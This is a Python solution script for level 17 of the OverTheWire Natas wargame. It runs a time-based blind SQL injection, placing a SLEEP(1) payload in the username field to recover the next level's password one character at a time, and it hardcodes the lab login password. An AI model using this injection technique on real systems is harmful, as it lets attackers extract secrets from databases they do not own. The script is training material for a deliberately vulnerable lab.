#!/usr/bin/env python3
'''
3:37
Level 17 → Level 18
TIMING ATTACK SQL Injection

github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas17.py

https://www.youtube.com/watch?v=GDOpW-LShy8&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=15

https://www.youtube.com/watch?v=vz3XVCPBSbA

Username: natas17
URL:      http://natas17.natas.labs.overthewire.org
password:   8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
problem:

write up:



Manual Mode


'''
import string

import requests
import re
from string import *

from time import *

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
print(characters)

from pyodbc import lowercase

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )

content = response.text

print (content)
#########################3


session = requests.Session()
seen_password = list()
while ( len(seen_password) < 32 ):

    for character in characters:
        start_time = time()

        # print "start_time", start_time
        print ("trying", "".join(seen_password) + character)
        response = session.post(url,
             data = {"username": 'natas18" AND BINARY password LIKE "' +
                                 "".join(seen_password) + character +
                                '%" AND SLEEP(1) # '},
             auth = (username, password) )
        content = response.text
        end_time = time()
        difference = end_time - start_time


        if ( difference > 1 ):
            # success, correct character!
            seen_password.append(character)
            break
    # print content
